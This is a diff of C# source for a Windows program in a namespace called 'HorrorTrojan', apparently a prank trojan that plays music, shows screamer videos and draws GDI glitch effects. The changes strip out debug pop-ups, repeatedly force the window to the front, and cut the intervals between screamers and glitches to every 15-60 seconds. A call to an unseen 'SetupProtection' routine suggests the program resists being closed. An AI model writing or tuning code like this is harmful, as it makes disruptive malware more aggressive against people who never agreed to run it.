@@ -4,7 +4,7 @@ using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.IO;
-using System.Diagnostics; // ← ДОБАВЛЕНО
+using System.Diagnostics;
 using System.Reflection;
 using WMPLib;
 
@@ -50,17 +50,19 @@ namespace HorrorTrojan
 
         public MainInterface()
         {
-            MessageBox.Show("Конструктор формы", "Debug", MessageBoxButtons.OK, MessageBoxIcon.Information);
             InitializeComponent();
             this.Load += MainInterface_Load;
+
+            // ПРИНУДИТЕЛЬНЫЙ ПОКАЗ ФОРМЫ
+            this.WindowState = FormWindowState.Normal;
+            this.Visible = true;
             this.Show();
             this.BringToFront();
-            MessageBox.Show("Форма создана и показана", "Debug", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            this.Activate();
         }
 
         private void MainInterface_Load(object sender, EventArgs e)
         {
-            MessageBox.Show("Загрузка формы начата", "Debug", MessageBoxButtons.OK, MessageBoxIcon.Information);
             try
             {
                 if (!Directory.Exists(appDataPath))
@@ -76,7 +78,12 @@ namespace HorrorTrojan
                 StartTimers();
                 SetupProtection();
                 PlayMusic();
-                MessageBox.Show("Все ресурсы загружены", "Debug", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                // ЕЩЁ РАЗ ПРИНУДИТЕЛЬНО ПОКАЗЫВАЕМ
+                this.Visible = true;
+                this.Show();
+                this.BringToFront();
+                this.Activate();
             }
             catch (Exception ex)
             {
@@ -148,15 +155,18 @@ namespace HorrorTrojan
 
         private void StartTimers()
         {
+            // ОСНОВНОЙ ТАЙМЕР (каждую секунду)
             mainTimer.Interval = 1000;
             mainTimer.Tick += MainTimer_Tick;
             mainTimer.Start();
 
-            glitchTimer.Interval = rnd.Next(120000, 180000);
+            // GDI ЭФФЕКТЫ (каждые 30-60 секунд)
+            glitchTimer.Interval = rnd.Next(30000, 60000);
             glitchTimer.Tick += GlitchTimer_Tick;
             glitchTimer.Start();
 
-            videoTimer.Interval = rnd.Next(50000, 120000);
+            // СКРИМЕРЫ (каждые 15-30 секунд)
+            videoTimer.Interval = rnd.Next(15000, 30000);
             videoTimer.Tick += VideoTimer_Tick;
             videoTimer.Start();
         }
@@ -184,7 +194,7 @@ namespace HorrorTrojan
             if (!isVideoActive && !isGlitchActive)
             {
                 isGlitchActive = true;
-                glitchTimer.Interval = rnd.Next(5000, 15000);
+                glitchTimer.Interval = rnd.Next(15000, 30000); // 15-30 секунд
                 StartGlitchEffect();
             }
         }
@@ -194,7 +204,7 @@ namespace HorrorTrojan
             if (!isGlitchActive && !isVideoActive)
             {
                 isVideoActive = true;
-                videoTimer.Interval = rnd.Next(50000, 120000);
+                videoTimer.Interval = rnd.Next(15000, 30000); // 15-30 секунд
                 ShowRandomVideo();
             }
         }
